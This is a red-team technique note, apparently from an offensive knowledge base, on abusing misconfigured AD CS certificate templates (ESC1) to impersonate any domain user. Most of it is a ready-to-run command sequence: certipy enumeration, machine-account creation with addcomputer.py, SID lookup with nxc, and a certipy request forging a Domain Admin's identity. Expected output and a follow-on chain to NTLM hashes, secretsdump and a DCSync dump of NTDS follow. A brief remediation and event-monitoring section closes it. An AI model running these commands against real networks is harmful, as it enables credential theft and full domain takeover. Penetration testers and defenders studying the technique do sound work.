# AD CS ESC1 — Arbitrary SubjectAltName Impersonation

**MITRE:** [T1649 - Steal or Forge Authentication Certificates](https://attack.mitre.org/techniques/T1649/)  
**Phase:** Credential Access / Privilege Escalation  
**Auth Required:** Yes (low-priv domain creds + machine account or Domain Computers enrollment rights)  
**Tags:** #credential-access #adcs #esc1 #privesc #certificate

---

## Summary
Certificate templates with `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` enabled allow the enrollee to specify an arbitrary Subject Alternative Name (SAN). An attacker can request a certificate for any domain user — including Domain Admins — by specifying their UPN and SID in the request. No exploits or CVEs required; pure misconfiguration.

## Mechanism
- **Protocol:** MS-WCCE / DCOM (cert enrollment)
- **RPC/Function:** ICertRequest::Request with SAN extension
- **Effect:** CA issues a certificate asserting the identity of the specified user, which can be exchanged for a TGT + NTLM hash via PKINIT

## Prerequisites
1. AD CS present in environment (`certipy find` confirms)
2. Template with ESC1 conditions:
   - `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` set
   - Client Authentication EKU present
   - Low-priv principal has Enroll rights
3. Account with enrollment rights (machine account if `Domain Computers` can enroll)

## Commands

```bash
# Step 1 — Confirm ESC1 and identify enrollment rights
certipy find -u '[user]@[domain]' -p '[password]' -dc-ip [dc-ip] -vulnerable

# Step 2 — Add machine account if Domain Computers enrollment required
addcomputer.py '[domain]/[user]:[password]' -dc-ip [dc-ip] -method LDAPS \
  -computer-name [machine-name] -computer-pass [machine-pass]

# Step 3 — Get target UPN + SID
nxc ldap [dc-ip] -u '[user]' -p '[password]' \
  --query "(sAMAccountName=[target])" "sAMAccountName objectSid userPrincipalName"

# Step 4 — Request cert impersonating target
certipy req \
  -u '[machine-account]$' -p '[machine-pass]' \
  -dc-ip [dc-ip] -target [ca-host] \
  -ca [ca-name] -template [vulnerable-template] \
  -upn [target@domain] -sid [target-SID]
```

## Expected Output
```
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Got certificate with UPN 'svc_scanner@corp.local'
[*] Certificate object SID is 'S-1-5-21-...-1234'
[*] Saved certificate and private key to 'svc_scanner.pfx'
```

## Notes
- `--admin-count` enumeration often reveals the best target (service accounts with DA-equivalent rights)
- `-dc-ip` = Domain Controller (Kerberos/LDAP auth)
- `-target` = CA server DNS name from `certipy find` output — **not the same as the DC**
- `-ca` = CA display name from `certipy find` (e.g. `corp-CA01-CA`)

## Relay / Follow-On Attack Path
- `.pfx` obtained → [[adcs-cert-auth]] → TGT + NTLM hash
- NTLM hash → `nxc smb -H` → validate DA access
- NTLM hash → `secretsdump.py` → DCSync → full NTDS dump

## Remediation
- Restrict Enroll/AutoEnroll on vulnerable templates to only required principals
- Remove templates entirely if unused
- Enable manager approval on templates that allow SAN specification
- Monitor EID 4886 (cert request received) and EID 4887 (cert issued) on CA

## Related
- [[ttps/recon/ad-user-enumeration]]
- [[ttps/credential-access/adcs-cert-auth]]
- [[tools/certipy]]
- [[tools/addcomputer]]
- [[playbooks/adcs-esc1-domain-admin]]
